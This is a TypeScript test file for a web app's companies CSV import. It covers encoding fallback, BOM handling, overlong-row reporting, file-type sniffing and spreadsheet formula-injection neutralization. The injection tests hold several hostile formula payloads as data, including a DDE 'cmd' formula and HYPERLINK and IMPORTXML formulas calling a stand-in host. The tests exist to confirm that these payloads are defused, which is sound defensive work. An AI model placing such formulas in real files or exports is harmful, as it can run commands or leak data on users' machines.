import { describe, expect, it, vi } from "vitest";

// `lib/import/read.ts` starts with `import "server-only"`, whose whole job is to
// throw when it is loaded outside a React Server Component. Replacing it here is
// what lets the re-export identity below be checked at all.
vi.mock("server-only", () => ({}));

import { escapeField, neutralizeFormulaLead } from "@/lib/export/delimited";
import * as bytes from "@/lib/import/bytes";
import * as read from "@/lib/import/read";
import {
  MAX_NAME_LENGTH,
  overlongLines,
  parsePastedNames,
} from "@/app/(app)/companies/paste";

/**
 * The companies CSV door (#202, T2 slice): a file lands in the SAME box the
 * paste path owns, through the SAME byte machinery the wizard owns. These
 * tests pin the three seams that make that true — the shared implementation,
 * the decode, and the per-line failure contract — plus the injection
 * round-trip the attack list names.
 */

describe("one byte machinery, two doors", () => {
  it("read.ts re-exports ARE lib/import/bytes.ts — the same functions, not a copy", () => {
    // A second copy of the magic bytes or the cp1252 table would let the two
    // import surfaces answer differently for the same file. Identity, not
    // equivalence: the modules must share one implementation.
    expect(read.sniffFormat).toBe(bytes.sniffFormat);
    expect(read.decodeBytes).toBe(bytes.decodeBytes);
    expect(read.decodeWindows1252).toBe(bytes.decodeWindows1252);
    expect(read.tooLarge).toBe(bytes.tooLarge);
    expect(read.MAX_UPLOAD_BYTES).toBe(bytes.MAX_UPLOAD_BYTES);
    expect(read.MAX_ROWS).toBe(bytes.MAX_ROWS);
  });

  it("readDelimited and decodeBytes agree on the cp1252 fallback", () => {
    // 0x92 is windows-1252's right single quote. Strict UTF-8 refuses it, the
    // fallback maps it — and both entry points must land on the same text.
    const data = new Uint8Array([0x4f, 0x92, 0x52, 0x65, 0x69, 0x6c, 0x6c, 0x79]); // O'Reilly
    const decoded = bytes.decodeBytes(data);
    expect(decoded.text).toBe("O’Reilly");
    expect(decoded.encoding).toBe("windows-1252");
    const viaWizard = read.readDelimited(data);
    expect(viaWizard.rows[0][0]).toBe("O’Reilly");
    expect(viaWizard.encoding).toBe("windows-1252");
  });

  it("strips a UTF-8 BOM from the bytes, on both encodings' paths", () => {
    const bom = [0xef, 0xbb, 0xbf];
    const utf8 = bytes.decodeBytes(new Uint8Array([...bom, 0x41, 0x6f, 0x6e]));
    expect(utf8).toEqual({ text: "Aon", encoding: "utf-8", bom: true });
    // A BOM welded to a cp1252 body: TextDecoder would have stripped it, the
    // fallback would not — the strip must happen on the BYTES, before either.
    const cp1252 = bytes.decodeBytes(new Uint8Array([...bom, 0x92, 0x41]));
    expect(cp1252.bom).toBe(true);
    expect(cp1252.encoding).toBe("windows-1252");
    expect(cp1252.text).toBe("’A");
  });

  it("decodes clean UTF-8 as UTF-8, never via the fallback", () => {
    const decoded = bytes.decodeBytes(new TextEncoder().encode("Zoë Industries\nAon"));
    expect(decoded).toEqual({ text: "Zoë Industries\nAon", encoding: "utf-8", bom: false });
  });
});

describe("overlongLines — a malformed row fails alone, with its address", () => {
  it("names the 1-based line of each dropped row, and the chunk survives", () => {
    const long = "x".repeat(MAX_NAME_LENGTH + 1);
    const blob = `Aon\n${long}\nExelon`;
    expect(overlongLines(blob)).toEqual([{ line: 2, name: long }]);
    // The failure is the row's alone: both neighbours still parse.
    expect(parsePastedNames(blob)).toEqual(["Aon", "Exelon"]);
  });

  it("counts CRLF and lone-CR line endings as one line break each", () => {
    const long = "y".repeat(MAX_NAME_LENGTH + 5);
    expect(overlongLines(`Aon\r\nExelon\r\n${long}`)).toEqual([{ line: 3, name: long }]);
    expect(overlongLines(`Aon\rExelon\r${long}`)).toEqual([{ line: 3, name: long }]);
  });

  it("flags every overlong cell on a line, not just the first", () => {
    const a = "a".repeat(MAX_NAME_LENGTH + 1);
    const b = "b".repeat(MAX_NAME_LENGTH + 1);
    expect(overlongLines(`${a},${b}`)).toEqual([
      { line: 1, name: a },
      { line: 1, name: b },
    ]);
  });

  it("measures the NORMALIZED candidate, exactly as the parser does", () => {
    // A raw segment past the bound whose wrapping quotes strip to under it: the
    // parser KEEPS this row, so flagging it would report a failure that did not
    // happen. The old form-side count measured the raw segment and got this
    // wrong; the diagnostic now shares the parser's own normalization.
    const inner = "z".repeat(MAX_NAME_LENGTH - 1);
    const raw = `"${inner}"`;
    expect(raw.length).toBeGreaterThan(MAX_NAME_LENGTH);
    expect(parsePastedNames(raw)).toEqual([inner]);
    expect(overlongLines(raw)).toEqual([]);
  });

  it("never flags a blank line — absent is absent, not an error and not a default", () => {
    // FP-SET-001's rule applied to import: a blank row is "nothing was
    // provided". It must neither fail the import nor produce any invented row.
    expect(overlongLines("Aon\n\n   \n\t\nExelon\n")).toEqual([]);
    expect(parsePastedNames("Aon\n\n   \n\t\nExelon\n")).toEqual(["Aon", "Exelon"]);
  });

  it("agrees with the parser: flagged rows are exactly the length-dropped ones", () => {
    // The parity property behind the preview's honesty. Candidates the parser
    // keeps, plus rows flagged here, account for every non-blank, non-duplicate
    // candidate — nothing is dropped without a line number naming it.
    const long1 = "q".repeat(MAX_NAME_LENGTH + 40);
    const long2 = "=A1&" + "r".repeat(MAX_NAME_LENGTH);
    const blob = `Aon, ${long1}\n"Kraft Heinz"\taon\n${long2}\n- 1. McDonald's\n`;
    const kept = parsePastedNames(blob);
    const flagged = overlongLines(blob);
    expect(kept).toEqual(["Aon", "Kraft Heinz", "McDonald's"]);
    expect(flagged.map((f) => f.line)).toEqual([1, 3]);
    for (const f of flagged) expect(f.name.length).toBeGreaterThan(MAX_NAME_LENGTH);
  });
});

describe("formula-lead neutralization on echo-back", () => {
  it("neutralizes the attack list's payloads with the export path's own rule", () => {
    for (const hostile of [
      "=cmd|' /c calc'!A1",
      "=HYPERLINK(\"https://evil.example\",\"open\")",
      "=IMPORTXML(\"https://evil.example\",\"//x\")",
      "+1+1",
      "@SUM(A1)",
      "\tAcme",
      "\rAcme",
      "-2+3", // expression-shaped near-number: NOT exempt
    ]) {
      expect(neutralizeFormulaLead(hostile)).toBe(`'${hostile}`);
    }
  });

  it("keeps the inert leads the exemption exists for", () => {
    for (const inert of ["-15", "+3.5", "-", "Aon", "3M"]) {
      expect(neutralizeFormulaLead(inert)).toBe(inert);
    }
  });

  it("is the SAME rule escapeField applies — not a parallel one", () => {
    for (const value of ["=SUM(A1)", "-15", "-2+3", "Aon", "@x"]) {
      const escaped = escapeField(value, ",");
      expect(escaped.replace(/^"|"$/g, "").replace(/""/g, '"')).toBe(
        neutralizeFormulaLead(value),
      );
    }
  });

  it("round-trips a hostile CSV: imported verbatim, inert on every echo into a file", () => {
    // The import must NOT rewrite the name — a leading apostrophe added at
    // import would corrupt the stored fact (export-round-trip.test.ts pins the
    // converse cost). Neutralization belongs to the moment of echo-back.
    // Comma-free payload on purpose: the splitter treats a comma as a separator
    // (the documented trade in paste.ts), so a comma-carrying formula arrives
    // SPLIT — each piece still formula-lead, still neutralized on echo.
    const hostile = "=cmd|' /c calc'!A1";
    const file = new TextEncoder().encode(`${hostile}\nExelon\n`);
    const names = parsePastedNames(bytes.decodeBytes(file).text);
    expect(names).toEqual([hostile, "Exelon"]);
    expect(escapeField(names[0], ",")).toBe(`'${hostile}`);
  });
});

describe("the file door pays the wizard's caps and refusals", () => {
  it("refuses a file over MAX_UPLOAD_BYTES with a sentence, not a status code", () => {
    expect(bytes.tooLarge({ bytes: bytes.MAX_UPLOAD_BYTES + 1 })).toMatch(/limit is 10 MB/);
    expect(bytes.tooLarge({ bytes: bytes.MAX_UPLOAD_BYTES })).toBeNull();
  });

  it("names a workbook, a PDF and UTF-16 text instead of parsing them as CSV", () => {
    const zip = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x00, 0x00]);
    expect(bytes.sniffFormat("companies.xlsx", zip)).toEqual({
      kind: "xlsx",
      reason: expect.stringContaining("Excel"),
    });
    const pdf = bytes.sniffFormat("companies.pdf", new Uint8Array([0x25, 0x50, 0x44, 0x46]));
    expect(pdf.kind).toBe("rejected");
    const utf16 = bytes.sniffFormat("companies.csv", new Uint8Array([0xff, 0xfe, 0x43, 0x00]));
    expect(utf16.kind).toBe("rejected");
    // The plain case still reads as text.
    expect(bytes.sniffFormat("companies.csv", new TextEncoder().encode("Aon\n")).kind).toBe(
      "csv",
    );
  });
});
